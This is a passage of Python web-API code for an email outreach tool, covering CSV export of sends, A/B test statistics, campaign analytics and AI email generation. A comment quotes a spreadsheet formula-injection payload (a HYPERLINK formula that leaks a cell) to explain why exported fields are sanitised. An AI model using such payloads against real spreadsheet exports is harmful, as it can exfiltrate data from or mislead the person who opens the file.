    # an operator would recognise as input: ``to_email`` is an address the
    # scraper harvested off a third-party site, ``subject`` is carried through
    # from inbound mail on a reply thread, and ``error`` is *whatever the
    # receiving mail server chose to say* — a hostile MX can answer
    # ``550 =HYPERLINK("http://x/"&A1,"Click")`` and have it stored verbatim.
    # None of that fails here; it executes on the operator's machine when they
    # double-click the download. See ``app.csv_export``.
    for s in sends:
        writer.writerow([
            str(s.id),
            str(s.template_id) if s.template_id else "",
            str(s.contact_id) if s.contact_id else "",
            csv_safe(s.to_email),
            csv_safe(s.subject),
            csv_safe(s.status),
            s.sent_at.isoformat() if s.sent_at else "",
            s.opened_at.isoformat() if s.opened_at else "",
            s.clicked_at.isoformat() if s.clicked_at else "",
            csv_safe(s.ab_variant),
            s.scheduled_at.isoformat() if s.scheduled_at else "",
            csv_safe(s.error),
        ])

    output.seek(0)
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    return StreamingResponse(
        iter([output.getvalue()]),
        media_type="text/csv",
        headers={
            "Content-Disposition": f'attachment; filename="email_sends_{timestamp}.csv"'
        },
    )


@router.get("/email-sends/ab-stats", response_model=ABStatsResponse)
async def get_ab_stats(
    template_id: uuid.UUID = Query(...),
    db: AsyncSession = Depends(get_db),
):
    """Get A/B test results for a template."""
    from sqlalchemy import func as sa_func

    # The denominator is *delivered* mail, not every row carrying a variant.
    #
    # The variant is assigned before the send is attempted, so a recipient who
    # turned out to be suppressed, held by the warm-up ramp, stopped by the
    # spam gate or refused by a spent daily cap still gets a row stamped "A" or
    # "B" — with `status` recording that nothing left. Counting those inflated
    # whichever arm happened to draw more of them, and the assignment is
    # `i % 2` over an arbitrary contact list, so which arm that is has nothing
    # to do with the copy under test. A subject line could win or lose on how
    # many of its recipients had unsubscribed.
    #
    # `bounced` is excluded for the reason `FAILURE_STATUSES` gives: a bounce
    # is a list problem, and putting it in the denominator of an open rate
    # reports it as a copy problem.
    result = await db.execute(
        select(
            EmailSend.ab_variant,
            sa_func.count(EmailSend.id).label("total"),
            sa_func.count(EmailSend.opened_at).label("opened"),
            sa_func.count(EmailSend.clicked_at).label("clicked"),
        )
        .where(
            EmailSend.template_id == template_id,
            EmailSend.ab_variant.isnot(None),
            EmailSend.status.in_(DELIVERED_STATUSES),
        )
        .group_by(EmailSend.ab_variant)
    )
    rows = result.all()
    stats = []
    for row in rows:
        total = row.total or 0
        stats.append(ABStats(
            variant=row.ab_variant,
            total=total,
            opened=row.opened or 0,
            clicked=row.clicked or 0,
            open_rate=round((row.opened or 0) / total * 100, 1) if total else 0,
            click_rate=round((row.clicked or 0) / total * 100, 1) if total else 0,
        ))
    return ABStatsResponse(template_id=template_id, stats=stats)


@router.get("/email-sends/analytics", response_model=CampaignAnalytics)
async def get_campaign_analytics(db: AsyncSession = Depends(get_db)):
    """Campaign analytics summary — counts and rates over real sends only.

    Every count here filtered on ``status != "scheduled"``, which is the widest
    possible reading of "a send": it admits ``skipped`` (no address, suppressed,
    unsubscribed, spam-gate block, warm-up hold, spent cap, engaged kill
    switch), ``suppressed``, ``halted``, ``error``, ``failed`` and the
    transient ``pending`` row the compose loop writes before it tries. None of
    those put a message on the wire, and they are the denominator four
    percentages are divided by — so every rate on this page dropped whenever
    sending was being *prevented*, which is precisely when someone reads it.

    ``WIRE_STATUSES`` is used for the volume tiles (a bounce was mail that went
    out) and ``DELIVERED_STATUSES`` for the rate denominators (a bounce was
    never delivered, so it is a list problem, not a copy problem).
    """
    from datetime import timedelta
    from sqlalchemy import cast, Date

    # Total counts by time period
    all_sends = await db.execute(
        select(func.count(EmailSend.id)).where(EmailSend.status.in_(WIRE_STATUSES))
    )
    total_all = all_sends.scalar() or 0

    # tz-aware: ``sent_at`` is TIMESTAMP(timezone=True), and a naive
    # ``utcnow()`` bound against it is interpreted in the session's timezone
    # rather than UTC — a silent whole-hours window shift on any box not set to
    # UTC.
    now = datetime.now(timezone.utc)
    seven_days_ago = now - timedelta(days=7)
    thirty_days_ago = now - timedelta(days=30)

    sends_7d = await db.execute(
        select(func.count(EmailSend.id)).where(
            EmailSend.sent_at >= seven_days_ago,
            EmailSend.status.in_(WIRE_STATUSES),
        )
    )
    total_7d = sends_7d.scalar() or 0

    sends_30d = await db.execute(
        select(func.count(EmailSend.id)).where(
            EmailSend.sent_at >= thirty_days_ago,
            EmailSend.status.in_(WIRE_STATUSES),
        )
    )
    total_30d = sends_30d.scalar() or 0

    # Rates. Engagement divides by *delivered* mail; the bounce rate divides by
    # everything that reached the wire, because a bounce is in its own
    # numerator and excluding it from its own denominator understates it.
    delivered_total = (
        await db.execute(
            select(func.count(EmailSend.id)).where(
                EmailSend.status.in_(DELIVERED_STATUSES)
            )
        )
    ).scalar() or 0

    if total_all > 0:
        opened = await db.execute(
            select(func.count(EmailSend.id)).where(EmailSend.opened_at.isnot(None))
        )
        clicked = await db.execute(
            select(func.count(EmailSend.id)).where(EmailSend.clicked_at.isnot(None))
        )
        replied = await db.execute(
            select(func.count(EmailSend.id)).where(EmailSend.replied_at.isnot(None))
        )
        bounced = await db.execute(
            select(func.count(EmailSend.id)).where(EmailSend.status == "bounced")
        )
        _d = delivered_total or 1
        open_rate = round((opened.scalar() or 0) / _d * 100, 1)
        click_rate = round((clicked.scalar() or 0) / _d * 100, 1)
        reply_rate = round((replied.scalar() or 0) / _d * 100, 1)
        bounce_rate = round((bounced.scalar() or 0) / total_all * 100, 1)
    else:
        open_rate = click_rate = reply_rate = bounce_rate = 0.0

    # Daily sends for last 30 days
    daily = await db.execute(
        select(
            cast(EmailSend.sent_at, Date).label("date"),
            func.count(EmailSend.id).label("count"),
        )
        .where(
            EmailSend.sent_at >= thirty_days_ago,
            EmailSend.status.in_(WIRE_STATUSES),
        )
        .group_by(cast(EmailSend.sent_at, Date))
        .order_by(cast(EmailSend.sent_at, Date))
    )
    daily_sends = [{"date": str(row.date), "count": row.count} for row in daily.all()]

    return CampaignAnalytics(
        total_sent_7d=total_7d,
        total_sent_30d=total_30d,
        total_sent_all=total_all,
        open_rate=open_rate,
        click_rate=click_rate,
        reply_rate=reply_rate,
        bounce_rate=bounce_rate,
        daily_sends=daily_sends,
    )


# --- AI Email Generation ---

@router.post("/email-templates/generate", response_model=AIEmailGenerateResponse)
async def generate_ai_email(payload: AIEmailGenerateRequest):
    """Generate a personalized outreach email using AI.

    Takes lead data (name, company, industry, title) and produces a
    tailored subject + body. Falls back to a template-based response
    if AI generation fails.

    The demo_link in the response is dynamically selected based on
    the target company's industry.
    """
    lead_data = {
        "first_name": payload.first_name,
        "company_name": payload.company_name,
        "industry": payload.industry,
        "title": payload.title,
        "city": payload.city,
    }

    result = await ai_generate_email(
        lead_data=lead_data,
        template_type=payload.template_type,
        custom_instructions=payload.custom_instructions,
    )

    return AIEmailGenerateResponse(
        subject=result["subject"],
        body=result["body"],
        demo_link=result["demo_link"],
        ai_generated=result["ai_generated"],
        model=result.get("model"),
        template_type=result["template_type"],
    )
